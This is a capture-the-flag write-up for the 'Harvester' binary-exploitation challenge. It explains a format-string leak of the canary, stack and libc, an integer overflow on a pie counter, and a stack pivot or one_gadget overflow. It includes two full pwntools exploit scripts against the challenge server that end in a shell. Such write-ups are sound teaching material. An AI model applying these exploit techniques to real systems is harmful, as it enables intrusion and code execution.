# Cyber Apocalypse 2021

## Harvester

> These giant bird-looking creatures come once a day and harvest everything from our farms, leaving nothing but soil behind. We need to do something to stop them, otherwise there will be no food left for us. It will be even better instead of stopping them, tame them and take advantage of them! They seem to have some artificial implants, so if we hack them, we can take advantage of them. These creatures seem to love cherry pies for some reason..
> 
> This challenge will raise 43 euros for a good cause.
>
> [`pwn_harvester.zip`](pwn_harvester.zip)

Tags: _pwn_ _x86-64_ _format-string_ _rop_ _stack-pivot_ _one-gadget_ _bof_ _integer-overflow_


## Summary

Format-string exploit to leak canary, stack, and libc followed by an integer-overflow to unlock vulnerable code where a BOF can be used to either stack-pivot/ROPchain or lazy AF one\_gadget.

> I'll provide solutions for both. 


## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

All mitigations in place (you get this for free with `gcc` if you do nothing).  Nice!


### Decompile with Ghidra

I'll just cover the functions that looked interesting.

```c
void fight(void)
{
  long in_FS_OFFSET;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_38 = 0;
  local_30 = 0;
  local_28 = 0;
  local_20 = 0;
  printf("\x1b[1;36m");
  printstr("\nChoose weapon:\n");
  printstr(&DAT_00101138);
  read(0,&local_38,5);
  printstr("\nYour choice is: ");
  printf((char *)&local_38);
  printf("\x1b[1;31m");
  printstr("\nYou are not strong enough to fight yet.\n");
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
    __stack_chk_fail();
  }
  return;
}
```

`fight` reads in 5 bytes, then `printf`s your input with no format string.  5 bytes is not enough to launch a full-scale attack, but is enough to leak the stack.  But before we look at the stack we need to determine the `printf` offset.

Start at `%1$p` and keep incrementing until output matches input, e.g.:

```
# ./harvester_no_usleep

A wild Harvester appeared 🐦

Options:

[1] Fight 👊	[2] Inventory 🎒
[3] Stare 👀	[4] Run 🏃
> 1

Choose weapon:

[1] 🗡		[2] 💣
[3] 🏹		[4] 🔫
> %6$p

Your choice is: 0xa70243625
```

That output is little-endian hex for `%6$p`.  Looks like a match.

Next we need to look at the stack for useful leaks, this time set a breakpoint at `*fight+142`:

```
# gef harvester_no_usleep
gef➤  b *fight+142
Breakpoint 1 at 0xbbe
gef➤  run
Starting program: /pwd/datajerk/cyberapocalypsectf2021/harvester/harvester_no_usleep

A wild Harvester appeared 🐦

Options:

[1] Fight 👊	[2] Inventory 🎒
[3] Stare 👀	[4] Run 🏃
> 1

Choose weapon:

[1] 🗡		[2] 💣
[3] 🏹		[4] 🔫
> %6$p
```

Stack:

```
gef➤  telescope 16
0x00007fffffffe2c0│+0x0000: 0x0000000a70243625 ("%6$p\n"?)	 ← $rsp, $rdi
0x00007fffffffe2c8│+0x0008: 0x0000000000000000
0x00007fffffffe2d0│+0x0010: 0x0000000000000000
0x00007fffffffe2d8│+0x0018: 0x0000000000000000
0x00007fffffffe2e0│+0x0020: 0x00007fffffffe310  →  0x00007fffffffe330  →  0x0000000000000000
0x00007fffffffe2e8│+0x0028: 0x2464f1b17c8a5200
0x00007fffffffe2f0│+0x0030: 0x00007fffffffe310  →  0x00007fffffffe330  →  0x0000000000000000	 ← $rbp
0x00007fffffffe2f8│+0x0038: 0x0000555555400eca  →  <harvest+119> jmp 0x555555400f17 <harvest+196>
0x00007fffffffe300│+0x0040: 0x0000000100000020
0x00007fffffffe308│+0x0048: 0x2464f1b17c8a5200
0x00007fffffffe310│+0x0050: 0x00007fffffffe330  →  0x0000000000000000
0x00007fffffffe318│+0x0058: 0x0000555555400fd8  →  <main+72> mov eax, 0x0
0x00007fffffffe320│+0x0060: 0x00007fffffffe420  →  0x0000000000000001
0x00007fffffffe328│+0x0068: 0x2464f1b17c8a5200
0x00007fffffffe330│+0x0070: 0x0000000000000000
0x00007fffffffe338│+0x0078: 0x00007ffff7de70b3  →  <__libc_start_main+243> mov edi, eax
```

Now that we know the `printf` offset is `6`, we can count down to `10` for a stack leak, `11` for the canary, and `21` for libc leak `__libc_start_main+243` (remember that 243 for the Exploit section).

The next useful function is `stare`:

```c
void stare(void)
{
  long in_FS_OFFSET;
  undefined local_38 [40];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  printf("\x1b[1;36m");
  printstr("\nYou try to find its weakness, but it seems invincible..");
  printstr("\nLooking around, you see something inside a bush.");
  printf("\x1b[1;32m");
  printstr(&DAT_0010129a);
  pie = pie + 1;
  if (pie == 0x16) {
    printf("\x1b[1;32m");
    printstr("\nYou also notice that if the Harvester eats too many pies, it falls asleep.");
    printstr("\nDo you want to feed it?\n> ");
    read(0,local_38,0x40);
    printf("\x1b[1;31m");
    printstr("\nThis did not work as planned..\n");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
    __stack_chk_fail();
  }
  return;
}
```

If `pie == 0x16` then we get to call that `read` which will overflow the buffer wiping out the canary, saved base pointer, and the return address, and that is it.  `local_38` is `0x38` bytes from the return address, only leaving 8 (`0x40` - `0x38`) bytes for our ROPchain.  With only 8 bytes we either need to stack-pivot or call a win function (or one\_gadget).

Fortunately one\_gadget does work, however stack-pivot is what I went with initially because I knew it'd work (one\_gadget isn't always an option).

Since 8 byte's isn't large enough for the classic `ret; pop rdi; *'/bin/sh'; system` ROPchain, we'll have to put that in buffer `local_38`, then pivot the stack to that buffer with `leave`.

### Notes about `leave`

When a typical function starts, it leads with:

```assembly
PUSH RBP
MOV  RBP,RSP
```

This saves (pushes) the base of the current stack frame, then moves the stack pointer into the base pointer as the _base_ of the new stack frame.

`leave` does the opposite (frequently seen just before `ret`).  `leave` will `MOV RSP,RBP`, then `POP RBP` restoring RSP and RBP just before `RET` pops the return address of the stack into `RIP`.

If we load `local_38` with an 8 bytes of garbage, followed by our 32-byte attack, followed by the canary (to avoid a stack smash crash), followed by the address of the buffer (`local_38`), followed by a `leave; ret;` gadget, then on `stare` `leave` (end of function), RBP/RSP will be restored back to their pre-`stare` values, however the `stare` `ret` will pop _our_ `leave` gadget, that will move our overwritten RBP into RSP, then pop the start of our buffer into RBP, the `ret` part of the `leave; ret;` gadget will pop the start of our ROPchain and start the exploit.

For this stack-pivot attack to work we need compute the location of `local_38`; that is why we leak a stack _address_ using the format-string vulnerability from the `fight` function above.

First set breakpoint at `fight` again and get the stack leak from `printf` offset `10`:

```
# gef harvester_no_usleep
gef➤  b *fight+142
Breakpoint 1 at 0xbbe
gef➤  run
Starting program: /pwd/datajerk/cyberapocalypsectf2021/harvester/harvester_no_usleep

A wild Harvester appeared 🐦

Options:

[1] Fight 👊	[2] Inventory 🎒
[3] Stare 👀	[4] Run 🏃
> 1

Choose weapon:

[1] 🗡		[2] 💣
[3] 🏹		[4] 🔫
> blah
gef➤  telescope 5
0x00007fffffffe2c0│+0x0000: 0x0000000a68616c62 ("blah\n"?)	 ← $rsp, $rdi
0x00007fffffffe2c8│+0x0008: 0x0000000000000000
0x00007fffffffe2d0│+0x0010: 0x0000000000000000
0x00007fffffffe2d8│+0x0018: 0x0000000000000000
0x00007fffffffe2e0│+0x0020: 0x00007fffffffe310  →  0x00007fffffffe330  →  0x0000000000000000
```

Remember the `printf` offset is `6` from above, that puts stack address `0x00007fffffffe2e0` at offset `10`.

Next set a breakpoint at `*stare` and compute the delta:

```
gef➤  b *stare
Breakpoint 2 at 0x555555400d2b
gef➤  c
Continuing.
blah

You are not strong enough to fight yet.

Options:

[1] Fight 👊	[2] Inventory 🎒
[3] Stare 👀	[4] Run 🏃
> 3
> gef➤  p/x (long)$rsp - (long)0x00007fffffffe2e0 + 0x38
$3 = 0x50
```

When the function starts RSP will be moved to RBP (the base pointer is the base of the stack frame).  The difference between them + 0x38 (remember the buffer in Ghidra is called `local_38` (or look at the stack diagram)) is our delta.

If we leak the stack as before and subtract `0x50` we'll have the address of `local_38` in the stack.

Alternatively, forget all this stack stuff and just use one\_gadget, in that case you only need to leak the canary and libc.


### No usleep, no alarm

```python
#!/usr/bin/env python3

from pwn import *

binary = ELF('./harvester')
binary.write(0xa1c,5*b'\x90') # usleep
binary.write(0xf74,5*b'\x90') # alarm
binary.save('./harvester_no_usleep')
os.chmod('./harvester_no_usleep',0o755)
```

This will create a new binary without the `alarm` and `usleep`.  Adding `usleep` to `printstr` is extra annoying, almost as annoying as ANSI color and unicode emojis.


## Exploit

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./harvester_no_usleep')

if args.REMOTE:
    p = remote('46.101.22.121',31051)
    libc = ELF('./libc.so.6')
    __libc_start_main_offset = 231
else:
    p = process(binary.path)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    __libc_start_main_offset = 243
```    

Standard pwntools header, however note that the libc I used locally vs. the challenge provided libc have different `__libc_start_main` leak offsets.  `231` is the correct value for Ubuntu 18.04 libc (run `strings`, get the version, Google it, ...).  

> I know this number from experience, most of the CTF challenges in the last 12 months have used either Ubuntu 18 or 20.  That said, you could have got this from doing this in an Ubuntu 18.04 Docker container.

```python
# get canary @11
p.sendlineafter('> ','1')
p.sendlineafter('> ','%11$p')
p.recvuntil('is: ')
canary = int(p.recvuntil('\x1b[1;').strip(b'\x1b[1;').decode(),16)
log.info('canary: ' + hex(canary))

# get stack leak: @10
p.sendlineafter('> ','1')
p.sendlineafter('> ','%10$p')
p.recvuntil('is: ')
stack = int(p.recvuntil('\x1b[1;').strip(b'\x1b[1;').decode(),16)
target = stack - 0x50
log.info('target: ' + hex(target))

# get libc @21
p.sendlineafter('> ','1')
p.sendlineafter('> ','%21$p')
p.recvuntil('is: ')
__libc_start_main = int(p.recvuntil('\x1b[1;').strip(b'\x1b[1;').decode(),16) - __libc_start_main_offset
log.info('__libc_start_main: ' + hex(__libc_start_main))
libc.address = __libc_start_main - libc.sym.__libc_start_main
log.info('libc.address: ' + hex(libc.address))
```

Select `fight` from the menu and leak the canary, stack, and libc, and compute the base of libc.

The `target` (address of `local_38`) is computed using the delta above (see Analysis section).

You cannot get to the BOF in `stare` unless you enter with `0x15` (21) pies; `stare` will increment this to `0x16` and unlock the BOF, but first you need 21 pies:

```
[1] Fight 👊	[2] Inventory 🎒
[3] Stare 👀	[4] Run 🏃
> 2

You have: 10 🥧

Do you want to drop some? (y/n)
> y

How many do you want to drop?
> -11

You have: 21 🥧
```

Basically, `10 - -11 = 21`, courtesy of an integer overflow (`local_18` is `int`):

```c
  int local_18;
  ...
  printstr("\nDo you want to drop some? (y/n)\n> ");
  read(0,local_13,2);
  if (local_13[0] == 'y') {
    printstr("\nHow many do you want to drop?\n> ");
    __isoc99_scanf(&%d,&local_18);
    pie = pie - local_18;
```    

Get the pies.

```python
# get 21 pies
p.sendlineafter('> ','2')
p.sendlineafter('> ','y')
p.sendlineafter('> ','-11')

# stare
p.sendlineafter('> ','3')

pop_rdi = next(libc.search(asm('pop rdi; ret')))

payload  = b''
payload += 8 * b'A'
payload += p64(pop_rdi+1)
payload += p64(pop_rdi)
payload += p64(libc.search(b"/bin/sh").__next__())
payload += p64(libc.sym.system)
payload += p64(canary)
payload += p64(target)
payload += p64(next(libc.search(asm('leave;ret;'))))

p.sendafter('> ',payload)
p.interactive()
```

At this point we select `stare` from the menu and the BOF is now unlocked (we have 22 pies).

`local_38` has 8 bytes of garbage that we need for the `leave` function to pop into RBP (see Analysis section) followed by our "classic" 32-byte ROPchain, then the canary, then the address of `local_38`, and finally a `leave; ret;` gadget.

Output:

```bash
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/cyberapocalypsectf2021/harvester/harvester_no_usleep'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 46.101.22.121 on port 31051: Done
[*] '/pwd/datajerk/cyberapocalypsectf2021/harvester/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] canary: 0xcb8755879c893600
[*] target: 0x7ffc005391b0
[*] __libc_start_main: 0x7fb366bf2b10
[*] libc.address: 0x7fb366bd1000
[*] Switching to interactive mode

This did not work as planned..
$ cat flag.txt
CHTB{h4rv35t3r_15_ju5t_4_b1g_c4n4ry}
```

### Exploit (one\_gadget)

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./harvester_no_usleep')

p = remote('46.101.22.121',31051)
libc = ELF('./libc.so.6')
libc.symbols['gadget'] = [0x4f3d5, 0x4f432, 0x10a41c][0]
__libc_start_main_offset = 231

# get canary @11
p.sendlineafter('> ','1')
p.sendlineafter('> ','%11$p')
p.recvuntil('is: ')
canary = int(p.recvuntil('\x1b[1;').strip(b'\x1b[1;').decode(),16)
log.info('canary: ' + hex(canary))

# get libc @21
p.sendlineafter('> ','1')
p.sendlineafter('> ','%21$p')
p.recvuntil('is: ')
__libc_start_main = int(p.recvuntil('\x1b[1;').strip(b'\x1b[1;').decode(),16) - __libc_start_main_offset
log.info('__libc_start_main: ' + hex(__libc_start_main))
libc.address = __libc_start_main - libc.sym.__libc_start_main
log.info('libc.address: ' + hex(libc.address))

# get 21 pies
p.sendlineafter('> ','2')
p.sendlineafter('> ','y')
p.sendlineafter('> ','-11')

# stare
p.sendlineafter('> ','3')

payload  = b''
payload += 40 * b'A'
payload += p64(canary)
payload += 8 * b'B'
payload += p64(libc.sym.gadget)

p.sendafter('> ',payload)
p.interactive()
```

This is version is identical to the stack-pivot version except that a stack leak/pivot is not required and the 8 byte payload is not `leave`, instead it is the first of three gadgets from one_gadget:

```
# one_gadget libc.so.6 | grep ^0x | awk '{print $1}' | xargs
0x4f3d5 0x4f432 0x10a41c
```


Output:

```
[*] '/pwd/datajerk/cyberapocalypsectf2021/harvester/harvester_no_usleep'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 46.101.22.121 on port 31051: Done
[*] '/pwd/datajerk/cyberapocalypsectf2021/harvester/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] canary: 0xde40acb662fc7500
[*] __libc_start_main: 0x7f06b89f1b10
[*] libc.address: 0x7f06b89d0000
[*] Switching to interactive mode

This did not work as planned..
$ cat flag.txt
CHTB{h4rv35t3r_15_ju5t_4_b1g_c4n4ry}
```
